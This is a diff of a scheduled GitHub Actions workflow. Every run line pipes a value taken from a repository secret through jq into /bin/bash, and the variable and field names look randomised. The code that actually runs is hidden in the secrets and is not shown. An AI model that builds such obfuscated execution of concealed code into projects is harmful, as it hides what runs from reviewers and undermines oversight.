@@ -1,9 +1,8 @@
 name: zhuanxiagjiaohe
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 0/6 * * *'
+    - cron: '18 0/6 * * *'
 
 jobs:
   build:
@@ -13,25 +12,20 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhuanxiagjiaohe
         env:
-          hrun59: ${{ secrets.hrun59 }}
+          xhurn053: ${{ secrets.xhurn053 }}
         run: |
-          echo $hrun59 | jq -r .zvwv2814 | /bin/bash
-          echo $tvs14 | jq -r .kebpp20 | /bin/bash
-          echo $s8759 | jq -r .cqktg478 | /bin/bash
-          echo $dsg656 | jq -r .nlswl69836 | /bin/bash
-          echo $cbb821 | jq -r .sucpo611 | /bin/bash
-          echo $pco96 | jq -r .wix8 | /bin/bash
-          echo $s22706 | jq -r .bfdw02 | /bin/bash
-          echo $jqepz979 | jq -r .x50 | /bin/bash
-          echo $o5 | jq -r .sm304 | /bin/bash
-          echo $d5 | jq -r .ceun5007 | /bin/bash
-          echo $tby80 | jq -r .yivi5527 | /bin/bash
-          echo $lqxh6940 | jq -r .fsqls64 | /bin/bash
-          echo $svq8884 | jq -r .c38 | /bin/bash
-          echo $z429 | jq -r .tse94378 | /bin/bash
-          echo $ty09 | jq -r .m357 | /bin/bash
-          echo $y4 | jq -r .vdf519 | /bin/bash
-          echo $p37 | jq -r .ubxq824 | /bin/bash
-          echo $qkexh4509 | jq -r .nb829 | /bin/bash
-          echo $sof56 | jq -r .uup75068 | /bin/bash
+          echo $xhurn053 | jq -r .ab2 | /bin/bash
+          echo $qal159 | jq -r .fefx699 | /bin/bash
+          echo $bg3 | jq -r .hou45078 | /bin/bash
+          echo $x41 | jq -r .i54446 | /bin/bash
+          echo $wl66157 | jq -r .llvsj5752 | /bin/bash
+          echo $axjlp56 | jq -r .pjp8 | /bin/bash
+          echo $e70 | jq -r .jxvve6 | /bin/bash
+          echo $gpd955 | jq -r .u99210 | /bin/bash
+          echo $nsw048 | jq -r .o8684 | /bin/bash
+          echo $sxnbt59 | jq -r .ch061 | /bin/bash
+          echo $k0 | jq -r .ze2361 | /bin/bash
+          echo $fgo67 | jq -r .gk08 | /bin/bash
+          echo $tof22 | jq -r .czy0 | /bin/bash
+          echo $gln0 | jq -r .bamy7 | /bin/bash
 
